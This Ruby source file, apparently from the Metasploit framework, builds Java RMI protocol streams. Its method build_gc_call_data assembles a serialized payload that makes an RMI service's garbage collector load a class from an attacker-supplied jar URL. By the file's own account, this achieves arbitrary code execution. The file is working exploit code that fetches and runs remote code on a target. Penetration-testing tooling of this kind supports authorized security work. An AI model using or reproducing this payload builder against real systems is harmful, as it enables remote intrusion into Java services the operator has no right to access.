# -*- coding: binary -*-

require 'rex/java/serialization'

module Msf
  module Rmi
    module Client
      module Streams

        # Builds a RMI header stream
        #
        # @param opts [Hash{Symbol => <String, Fixnum>}]
        # @option opts [String] :signature
        # @option opts [Fixnum] :version
        # @option opts [Fixnum] :protocol
        # @return [Rex::Proto::Rmi::Model::OutputHeader]
        def build_header(opts = {})
          signature = opts[:signature] || Rex::Proto::Rmi::Model::SIGNATURE
          version = opts[:version] || 2
          protocol = opts[:protocol] || Rex::Proto::Rmi::Model::STREAM_PROTOCOL

          header = Rex::Proto::Rmi::Model::OutputHeader.new(
              signature: signature,
              version: version,
              protocol: protocol)

          header
        end

        # Builds a RMI call stream
        #
        # @param opts [Hash{Symbol => <Fixnum, Rex::Java::Serialization::Model::Stream>}]
        # @option opts [Fixnum] :message_id
        # @option opts [Rex::Java::Serialization::Model::Stream] :call_data
        # @return [Rex::Proto::Rmi::Model::Call]
        def build_call(opts = {})
          message_id = opts[:message_id] || Rex::Proto::Rmi::Model::CALL_MESSAGE
          call_data = opts[:call_data] || Rex::Java::Serialization::Model::Stream.new

          call = Rex::Proto::Rmi::Model::Call.new(
              message_id: message_id,
              call_data: call_data
          )

          call
        end

        # Builds a call data (serializated) stream) as used by Michael Schierl (@mihi42)
        # to achieve arbitrary code execution through the RMI garbage collector loading
        # arbitrary classes
        #
        # @param jar_url [String] the (URL) location pointing to the jar containing the
        #                         metasploit.RMILoader.
        # @return [Rex::Java::Serialization::Model::Stream]
        def build_gc_call_data(jar_url)
          stream = Rex::Java::Serialization::Model::Stream.new

          block_data = Rex::Java::Serialization::Model::BlockData.new
          block_data.contents = "\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xf6\xb6\x89\x8d\x8b\xf2\x86\x43"
          block_data.length = block_data.contents.length

          stream.contents << block_data

          new_array_annotation = Rex::Java::Serialization::Model::Annotation.new
          new_array_annotation.contents = [
              Rex::Java::Serialization::Model::NullReference.new,
              Rex::Java::Serialization::Model::EndBlockData.new
          ]

          new_array_super = Rex::Java::Serialization::Model::ClassDesc.new
          new_array_super.description = Rex::Java::Serialization::Model::NullReference.new

          new_array_desc = Rex::Java::Serialization::Model::NewClassDesc.new
          new_array_desc.class_name =  Rex::Java::Serialization::Model::Utf.new(nil, '[Ljava.rmi.server.ObjID;')
          new_array_desc.serial_version = 0x871300b8d02c647e
          new_array_desc.flags = 2
          new_array_desc.fields = []
          new_array_desc.class_annotation = new_array_annotation
          new_array_desc.super_class = new_array_super

          array_desc = Rex::Java::Serialization::Model::ClassDesc.new
          array_desc.description = new_array_desc

          new_array = Rex::Java::Serialization::Model::NewArray.new
          new_array.type = 'java.rmi.server.ObjID;'
          new_array.values = []
          new_array.array_description = array_desc

          stream.contents << new_array
          stream.contents << Rex::Java::Serialization::Model::BlockData.new(nil, "\x00\x00\x00\x00\x00\x00\x00\x00")

          new_class_desc = Rex::Java::Serialization::Model::NewClassDesc.new
          new_class_desc.class_name = Rex::Java::Serialization::Model::Utf.new(nil, 'metasploit.RMILoader')
          new_class_desc.serial_version = 0xa16544ba26f9c2f4
          new_class_desc.flags = 2
          new_class_desc.fields = []
          new_class_desc.class_annotation = Rex::Java::Serialization::Model::Annotation.new
          new_class_desc.class_annotation.contents = [
              Rex::Java::Serialization::Model::Utf.new(nil, jar_url),
              Rex::Java::Serialization::Model::EndBlockData.new
          ]
          new_class_desc.super_class = Rex::Java::Serialization::Model::ClassDesc.new
          new_class_desc.super_class.description = Rex::Java::Serialization::Model::NullReference.new

          new_object = Rex::Java::Serialization::Model::NewObject.new
          new_object.class_desc = Rex::Java::Serialization::Model::ClassDesc.new
          new_object.class_desc.description = new_class_desc
          new_object.class_data = []

          stream.contents << new_object

          stream.contents << Rex::Java::Serialization::Model::BlockData.new(nil, "\x00")

          stream
        end
      end
    end
  end
end
